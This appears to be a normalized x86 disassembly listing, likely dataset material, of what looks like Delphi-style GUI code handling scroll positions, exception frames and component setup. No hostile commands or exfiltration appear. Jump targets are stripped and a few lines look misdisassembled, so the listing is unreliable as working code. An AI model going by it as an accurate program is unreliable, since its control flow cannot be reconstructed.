sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_462658
jmp r-xdata
sub_4625e0
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_462cd0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_462658
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_4507d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_4507d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_450358
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_450358
jmp r-xdata
call sub_461dc8
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_46271c
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_462cd0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_4627d4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4507d8
push eax
call sub_42de84
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4507d8
push eax
call sub_42de84
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4507d8
push eax
call sub_42de84
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_422fe8
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4507d8
push eax
call sub_42de84
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4507d8
push eax
call sub_42de84
sub_4628dc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_4621f0
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_4621f0
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_4627d4
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4507d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_462658
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_4621f0
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_4629f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44c4cc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_461e70
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_461e70
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_462a6c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403254
mov eax [ esi + 0x20c ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c5f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_462ab8
push ebx
mov ebx eax
mov eax ebx
call sub_44d758
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_462cd0
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c4a0
test al al
jne r-xdata
mov eax ebx
call sub_4507d8
push eax
call sub_42deb8
sub_462af8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_462c50
mov ecx edi
mov edx esi
mov eax ebx
call sub_44cea0
pop edi
pop esi
pop ebx
retn
sub_462b38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_462c40
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4499bc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_462108
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_44d4d0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_462658
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d494
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d494
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_41a474
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_449728
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462c47
mov eax [ ebp - 0x10 ]
call sub_403254
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_461f50
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_41a5d0
xor ecx ecx
mov edx 0xb03e
call sub_44b16c
inc ebx
dec esi
jne r-xdata
sub_462c74
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_4627a8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_4627a8
mov eax ebx
call sub_462c50
jmp r-xdata
sub_462cd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_450adc
test al al
je r-xdata
xor eax eax
push ebp
push sub_462dbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_462270
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_462270
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_4628dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_4628dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_4628dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4628dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_4628dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4628dc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_462de0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_449ad0
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_449afc
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_449ad0
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_449afc
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4499bc
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_462658
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4499bc
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_449a00
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_462658
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_4499bc
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_462658
mov eax ebx
call sub_4499bc
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_449a00
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_449a00
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_462658
mov eax ebx
call sub_449a00
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_462f34
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_462658
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_462658
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_40651c
mov edx eax
mov eax ebp
call sub_4627a8
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_40651c
mov edx eax
mov eax ebp
call sub_4627a8
sub_462fd8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_462f34
mov ecx edi
mov edx esi
mov eax ebx
call sub_4502ac
pop edi
pop esi
pop ebx
retn
sub_463000
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_46306a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ed8c
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463071
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_463071
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4630a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_462c50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4630b0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_4630b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_462cd0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_463124
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_449a00
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_42b20c
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4499bc
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_42b20c
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_4191c4
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_44c80c
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_463194
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4631f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44fb1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4631fc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_463224
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4629f4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_449774
mov edx 0x29
mov eax esi
call sub_449798
mov [ esi + 0x220 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_463284
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_462aa8
xor eax eax
mov al [ ebx + 0x220 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_4632f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44fdb8
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
mov eax ebx
call sub_44dd40
sub_46331c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_463480
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_463460
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_40319c
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403578
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463467
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_463428
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41a390
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031a4
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
sub_4634a8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403450
and [ ebx + 0x2f4 ] 0xdf
sub_4634e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4629f4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_449728
xor edx edx
mov eax ebx
call sub_44974c
mov edx 0x140
mov eax ebx
call sub_449774
mov edx 0xf0
mov eax ebx
call sub_449798
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a750
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_463dfc
mov dl 0x1
mov eax [ r-xdata ]
call sub_423de4
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_448b94
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_40319c
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_464160
xor edx edx
mov eax ebx
call sub_44a17c
xor edx edx
mov eax ebx
call sub_44a0e4
mov dl 0x1
mov eax ebx
call sub_450918
mov edx ebx
mov eax [ rw-data ]
call sub_4687c4
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_463659
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_420264
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_41a714
xor edx edx
mov eax ebx
call sub_41d1e8
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_46766c
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_4636c4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035e0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_46378e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_465fe8
mov eax [ ebp - 0x4 ]
call sub_450adc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4687fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403254
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403254
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d788
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_462a6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463795
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_4637a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_4036f4#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
